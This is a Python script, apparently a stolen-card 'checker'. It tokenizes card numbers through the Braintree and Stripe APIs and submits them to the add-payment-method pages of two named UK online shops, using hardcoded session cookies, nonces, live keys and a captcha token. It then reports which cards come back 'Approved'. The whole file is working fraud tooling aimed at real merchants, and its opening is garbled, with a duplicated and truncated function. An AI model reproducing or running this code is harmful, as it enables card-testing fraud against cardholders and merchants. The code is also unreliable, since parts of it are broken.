import requests
import re
import random
import time
import string
import base64
from bs4 import BeautifulSoup
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	with open('fileb3.txt', 'r') as file:
		first_line = file.readline()
	while True:
		import time
import requests
import base64,user_agent,flagz
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:
		yy = yy.split("20")[1]
	r = requests.session()
	user = user_agent.generate_user_agent()
	
	headers = {
	    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjA5OTUxNjMsImp0aSI6ImZhYjgzMWYzLTE5NjQtNGNjMC04Yzc2LTQ0NWU3MmYyMDFmYSIsInN1YiI6IndjcjNjdmMyMzdxN2p6NmIiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IndjcjNjdmMyMzdxN2p6NmIiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6Imhha2tvR0JQIn19.GQGg3gg7f6es_QBjaSDUvndykKkmkAkmC87S-Jpf9ZcMvIWaZRuKacZS4SVEG6ViY3jBE_dm7Lk-sWAGGs661A',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': user,
}
	
	json_data = {
	    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '0d0a355d-f792-449f-b445-4693583bf176',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
                'billingAddress': {
                    'postalCode': 'SK11 6TJ',
                    'streetAddress': '323 E Pine St',
                },
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}
	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	tok = response.json()['data']['tokenizeCreditCard']['token']
	
	cookies = {
	    '_tccl_visitor': '2e8bdd2a-1921-47ae-b27b-2adf9c502bc6',
    'OptanonAlertBoxClosed': '2024-07-12T18:25:04.094Z',
    '_gid': 'GA1.3.408527082.1720905098',
    'woocommerce_items_in_cart': '1',
    'woocommerce_cart_hash': '3f0d91402a4636b95eebac8e7a04731a',
    '_tccl_visit': 'c8586459-af87-4a22-953f-5f170e7e0573',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-07-13%2022%3A09%3A41%7C%7C%7Cep%3Dhttps%3A%2F%2Fhakko.co.uk%2Fmy-account%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhakko.co.uk%2Fcheckout%2F',
    'sbjs_first_add': 'fd%3D2024-07-13%2022%3A09%3A41%7C%7C%7Cep%3Dhttps%3A%2F%2Fhakko.co.uk%2Fmy-account%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhakko.co.uk%2Fcheckout%2F',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    'store_noticeef1354580ffda939442cfe9eef42a6ab': 'hidden',
    '_lscache_vary': '3ab89b8a1f46f1fe58621add44a0e425',
    'wordpress_logged_in_adaf2a40537ce644f7a847620bf0abae': 'amiraymanejdjdayman121%7C1722118224%7CmcsFv6VxwOBAFUGtkA7sBE27MZikvf9C5sSrEj4FV3Q%7Cf6813aec8e59a1193afafdbd2fe711075491fc8d8b64fd603f856324ebd93787',
    'wp_woocommerce_session_adaf2a40537ce644f7a847620bf0abae': '153307%7C%7C1722114857%7C%7C1722028457%7C%7C98257bf82a9c4e949e086fcb6a94e211',
    '_ga': 'GA1.1.2016476444.1720808699',
    'OptanonConsent': 'isGpcEnabled=0&datestamp=Sun+Jul+14+2024+01%3A14%3A37+GMT%2B0300+(%D8%AA%D9%88%D9%82%D9%8A%D8%AA+%D8%B4%D8%B1%D9%82+%D8%A3%D9%88%D8%B1%D9%88%D8%A8%D8%A7+%D8%A7%D9%84%D8%B5%D9%8A%D9%81%D9%8A)&version=6.26.0&isIABGlobal=false&consentId=5d87e98f-7053-452b-a229-87cda5faff88&interactionCount=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1&hosts=H25%3A1%2CH1%3A1%2CH2%3A1%2CH21%3A1&genVendors=&geolocation=EG%3BDT&AwaitingReconsent=false',
    'sbjs_session': 'pgs%3D9%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhakko.co.uk%2Fmy-account%2Fadd-payment-method%2F',
    '_scc_session': 'pc=9&C_TOUCH=2024-07-13T22:14:37.803Z',
    '_ga_Z08YZNZWQR': 'GS1.1.1720908612.3.0.1720908891.0.0.0',
    '_ga_XX0K3QX8DY': 'GS1.1.1720908581.3.1.1720909072.0.0.0',
    '_ga_QZDWBZSN9J': 'GS1.1.1720908582.3.1.1720909072.60.0.0',
}

	
	headers = {
	    'authority': 'hakko.co.uk',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': '_tccl_visitor=2e8bdd2a-1921-47ae-b27b-2adf9c502bc6; OptanonAlertBoxClosed=2024-07-12T18:25:04.094Z; _gid=GA1.3.408527082.1720905098; woocommerce_items_in_cart=1; woocommerce_cart_hash=3f0d91402a4636b95eebac8e7a04731a; _tccl_visit=c8586459-af87-4a22-953f-5f170e7e0573; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-07-13%2022%3A09%3A41%7C%7C%7Cep%3Dhttps%3A%2F%2Fhakko.co.uk%2Fmy-account%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhakko.co.uk%2Fcheckout%2F; sbjs_first_add=fd%3D2024-07-13%2022%3A09%3A41%7C%7C%7Cep%3Dhttps%3A%2F%2Fhakko.co.uk%2Fmy-account%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhakko.co.uk%2Fcheckout%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; store_noticeef1354580ffda939442cfe9eef42a6ab=hidden; _lscache_vary=3ab89b8a1f46f1fe58621add44a0e425; wordpress_logged_in_adaf2a40537ce644f7a847620bf0abae=amiraymanejdjdayman121%7C1722118224%7CmcsFv6VxwOBAFUGtkA7sBE27MZikvf9C5sSrEj4FV3Q%7Cf6813aec8e59a1193afafdbd2fe711075491fc8d8b64fd603f856324ebd93787; wp_woocommerce_session_adaf2a40537ce644f7a847620bf0abae=153307%7C%7C1722114857%7C%7C1722028457%7C%7C98257bf82a9c4e949e086fcb6a94e211; _ga=GA1.1.2016476444.1720808699; OptanonConsent=isGpcEnabled=0&datestamp=Sun+Jul+14+2024+01%3A14%3A37+GMT%2B0300+(%D8%AA%D9%88%D9%82%D9%8A%D8%AA+%D8%B4%D8%B1%D9%82+%D8%A3%D9%88%D8%B1%D9%88%D8%A8%D8%A7+%D8%A7%D9%84%D8%B5%D9%8A%D9%81%D9%8A)&version=6.26.0&isIABGlobal=false&consentId=5d87e98f-7053-452b-a229-87cda5faff88&interactionCount=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1&hosts=H25%3A1%2CH1%3A1%2CH2%3A1%2CH21%3A1&genVendors=&geolocation=EG%3BDT&AwaitingReconsent=false; sbjs_session=pgs%3D9%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhakko.co.uk%2Fmy-account%2Fadd-payment-method%2F; _scc_session=pc=9&C_TOUCH=2024-07-13T22:14:37.803Z; _ga_Z08YZNZWQR=GS1.1.1720908612.3.0.1720908891.0.0.0; _ga_XX0K3QX8DY=GS1.1.1720908581.3.1.1720909072.0.0.0; _ga_QZDWBZSN9J=GS1.1.1720908582.3.1.1720909072.60.0.0',
    'origin': 'https://hakko.co.uk',
    'referer': 'https://hakko.co.uk/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,
}
	
	data = {
    'payment_method': 'braintree_cc',
    'braintree_cc_nonce_key': tok,
    'braintree_cc_device_data': '{"device_session_id":"a9479e89b1d550c2d24059c2e0d9d4bb","fraud_merchant_id":null,"correlation_id":"b2b39828dbcc2380b4799837dae4861f"}',
    'braintree_cc_3ds_nonce_key': '',
    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/wcr3cvc237q7jz6b/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/wcr3cvc237q7jz6b"},"merchantId":"wcr3cvc237q7jz6b","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["American Express","Discover","Maestro","UK Maestro","MasterCard","Visa"]},"threeDSecureEnabled":true,"threeDSecure":{"cardinalAuthenticationJWT":"eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiI2MmU3MmRmZi02OTUzLTQzZTQtYjI3OS0yNzcyM2YwNTgzNTkiLCJpYXQiOjE3MjA5MDg3NjcsImV4cCI6MTcyMDkxNTk2NywiaXNzIjoiNWQyZTYwYTFmYWI4ZDUxYzE4ZDdhNzdlIiwiT3JnVW5pdElkIjoiNWQyZTYwYTE2OTRlM2E0NDY0ZWRkN2NlIn0.IeB4gAhZi-04OvOGzwj1SAVC9tctn9HT-n1fUyXmk6k"},"paypalEnabled":true,"paypal":{"displayName":"Hakko","clientId":"AR5mQQV5vUNYSF9-TCEtSXM7mHHUfFc5hSihOKKmEyMzg9z0FNLzrfdVyTK-X_06XQ4ZCCbFww-R91jp","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"hakkoGBP","payeeEmail":null,"currencyIsoCode":"GBP"}}',
    'woocommerce-add-payment-method-nonce': '2a1ce52f5d',
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}
	
	response = requests.post('https://hakko.co.uk/my-account/add-payment-method/', cookies=cookies, headers=headers, data=data)
	
	text = response.text
	pattern = r'Reason: (.+?)\s*</li>'
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
	else:
		if 'Payment method successfully added.' in text:
			result = "1000: Approved"
		elif 'risk_threshold' in text:
			result = "RISK: Retry this BIN later."
		elif 'Please wait for 20 seconds.' in text:
			result = "try again"
		else:
			result = "Error"
			print('er#')
	if 'avs' in result or '1000: Approved' in result or 'Duplicate' in result or 'Insufficient Funds' in result:
		return 'Approved'
	else:
		return result
def sq(card):
	return 'ابقي غطيها كويس لما تيجي تنام'
def st(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&billing_details[name]=+&billing_details[email]=aahsiehdigei815%40li.me&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=476fadb6-4ca3-4a72-be47-5c2da0b69683f703a5&muid=df8d5b0e-1377-4d18-aa73-34155a30b778745312&sid=29b2ec14-129b-4bcf-b56c-66b2b54ca3a58fb5a6&payment_user_agent=stripe.js%2Ff01cf920a3%3B+stripe-js-v3%2Ff01cf920a3%3B+split-card-element&referrer=https%3A%2F%2Fwww.thonk.co.uk&time_on_page=85619&key=pk_live_VWRYPEVH9pBGaepBeXg0Ok0x00jrcIdpr2&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQZr3c0r8hbIK571yAwwTpTYJTzMdYwT51o0FVYm3dH-XozYbKg6LKpTy-cwO34iXXLD4Vbe8oCCMddz-wItRme4dB_DTc1OFVwwCQINVFwQXM5XknfHwefoDg0GYIiLCrlgnPfQc5lRpielY7OjHEEOSsfBJikCO0WNSpZmbPAeDOCniPGvAYzAS1lVaEwLWEZOSjmtDIhO03KIkim7eYZmsCIAW06UIRCVe8RUCoA2lpqtmyACxh7wzlqWyxmme3hUrjeaf8w31fD91GJ71IWGo6mk7BglIsESXirxdV4xPho8YwrhkENupqkKvy8jG_53dc7nLcTr3eSxYIJcoMqynYz68Zs3RNtI_GCHKJmAgmXqLKl-2MDSQ9f6vyWK-z5nzMqIZprQQt7oGqUe0Z903adOo8HiEyYyeCM38EepB1PnhEOqedoDiENt4-5WEh-uQf6oB6J5mMr-X6AVZOzl4HaaQL0PWvYSf-WOV0sQ7oafwW7VetCDSWriBNqcrk0yFN8RM3SXK0z3qhVQhbJHwn5-eh3o0qcAlhkaYifSAewSnR9k4u8spq0bPm1QUsyk3RyCvW1M23Vndmhm_631QcD1OD0vZAi-B6M2QFuPFzVuKZZ2wVPmeG5k9fH30GwZRLIxXEOyxQcJ6PRAGamhE1UVgTBwLKxpyIJKf8Vu7Y8UThLVU-68F3xq-chj7pkqMMFOepMsQAtW0B6Q-l_py_9NQ2m0YJoGrYorZaSnN-ad5soSiq_pUPvDrcLmEA9woUPYSZNFF3juLHFOD-M6pEb17IxkvqL0gIGQ7yg08UGX4OncOqPEqah4Xtj1DfOid3Xokw5_sF4OgA__NcN3HaQgGYl6WF-oE0WUELClPwe762DGyphYr_LbnINLywWOpcgUaVf9D5Sz1olqGirGrThvInnvI_8tsK-yCttG7BmFI6RQBO_Tu_H6vPh2a1tdGEbjTF57uEiJ-OyV8kVNnYg6EHIP6WmLe7mtwxr5AmbzKRoglGiEF2wWC6rLFv9-jJGI3QajbXxxj3ztGShiQqXCwQP6IWyRAOJ5P1lgS0TdYR2fFfWJP8fwPh87z0EPquvchaBf0DtWVVegaKP8KZP5HZrt9cDVVKTcds5wyWjq27ZGhK3QgtXLwIG3KJsP8v4BImBpbNxn7YwXBAnJLSVHII5339BXYSU_w9M48sPPPAHATqfykNtipgpLioWHRfLVCqxPe3_Lxz5eGkz2P1c7JTvFspNBo4Sj55HBa6F7Vl3UNhISHoNaW69hErZ5YDs1uRtNxkvQSrrCI2dw-hlEtebwhCPhOlXzDWn0AGuv5EaxQ-LN-sEtgyJ51z_5YGvMJna9jAgeO4rT-6v5nqgBczGSDX-48pMarTbEzcm-MYP0hLNbWG09WN3Vgz4xASqIg2Zm_LLZx5hfB1vdOavd0tzZdrWGpo8oLYrkw6-rO7DkhjkT2nTYJH3ykHBF9Ps0DlNmToT-8vQf8WoowQIbJl4_WPt13iIvqfUXNV_v90fd6EHEkJC1_xjCXrI6tQCwCGOfWPQYCbuw1HTJAIlYjdFLfq19INr6rwAQ0yavDSe4RE6YXpslEm31OOUIDIaZYt877Cai9qBLaYN5K79fue0IGm6w6q58o9r_gPn1ixRKUR6t_BHmHIerKDstos6MY_iJx3RhTlhxcNhwGQreU_t3zN_Qigzk1UCBXU8nB_NRZy8dOztWLDunORiLpdCes3nIcBiiF6pWbd82B5XE2ZuIbWvJDhpHupCLpi74Q4OiZRsN8qx-NY-6OB4RLj4zxqUk2jOA-5NEiQvhZfpHtT5wGjPylf1iCE4a8lCAV5woQZhs2yutVp7cq18H3S4Km3nKD2dKLE5ZHNcDIl6vHwzz3LWvCj43WvELzw22pjfx7mblzHGf37261eKwbrkZVUnBy3l5bFzr3fL0UdCOG1salMphY4CS3SJPP4CpwFS3NZ40IdHYvK2SztVCLaJ6j4sTx0by9F7OhQB0I5k8LlvN52VFx4UgU_pXhMHknPwiw65BVhqSjNrkVOsLjeZ3vjFYzO1d8MnkGfFP8pi_dqtp_o36cp2dG2ksdSsPScvRPG-nkSDHJtvALp5791oZuBmHnyX_g8-7jddHbu27G2HCIz3EQ6sT1X3QMf6bbAzv5IRBDiQYWRROs8xEiBmfF3EmURHck6ijZXhwzmab7kCoc2hhcmRfaWTOFDyEH6JrcqgxZjgzMGY2NaJwZAA.hYM6rQHHeDyqEE-KwNdjbMYoqhrhQvNYQUvhKqf1DVg'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	id =(response.json()['id'])
	
	cookies = {
	    'sbjs_migrations': '1418474375998%3D1',
	    'sbjs_current_add': 'fd%3D2024-07-20%2016%3A56%3A31%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thonk.co.uk%2F%7C%7C%7Crf%3D%28none%29',
	    'sbjs_first_add': 'fd%3D2024-07-20%2016%3A56%3A31%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thonk.co.uk%2F%7C%7C%7Crf%3D%28none%29',
	    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
	    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
	    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
	    '_fbp': 'fb.2.1721494593186.786666370757863311',
	    'woocommerce_current_currency': 'GBP',
	    'mailchimp_landing_site': 'https%3A%2F%2Fwww.thonk.co.uk%2Fmy-account%2F',
	    'mailchimp.cart.current_email': 'aahsiehdigei815@li.me',
	    'mailchimp_user_email': 'aahsiehdigei815%40li.me',
	    'wordpress_logged_in_f9aab48a6c2081ab1ed041c553ba2d31': 'aahsiehdigei815%7C1722704213%7Ci89XlrT0SBrrwcmoLYHNxlexXZejbB5QTy2ygCVe67M%7C7be38e4f43c4efe66c1b4feb6ffe003e97552871a17880ccf0dce3de8b9c0ce2',
	    '__stripe_mid': 'df8d5b0e-1377-4d18-aa73-34155a30b778745312',
	    '__stripe_sid': '29b2ec14-129b-4bcf-b56c-66b2b54ca3a58fb5a6',
	    'sbjs_session': 'pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.thonk.co.uk%2Fmy-account%2Fadd-payment-method%2F',
	}
	
	headers = {
	    'authority': 'www.thonk.co.uk',
	    'accept': 'application/json, text/javascript, */*; q=0.01',
	    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://www.thonk.co.uk',
	    'referer': 'https://www.thonk.co.uk/my-account/add-payment-method/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    'wc-ajax': 'wc_stripe_create_setup_intent',
	}
	
	data = {
	    'stripe_source_id': id,
	    'nonce': '3e1a558ceb',
	}
	
	response = requests.post('https://www.thonk.co.uk/', params=params, cookies=cookies, headers=headers, data=data)
	print(response.json()['message'])
	text = response.text
	pattern = r'Reason: (.+?)\s*</li>'
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
	else:
		if 'success' in text:
			result = "1000: Approved"
		elif 'risk_threshold' in text:
			result = "RISK: Retry this BIN later."
		elif 'Please wait for 20 seconds.' in text:
			result = "try again"
		else:
			result = "Error"
			print('er#')
	if 'avs' in result or '1000: Approved' in result or 'Duplicate' in result or 'Insufficient Funds' in result:
		return 'Approved'
	else:
		return result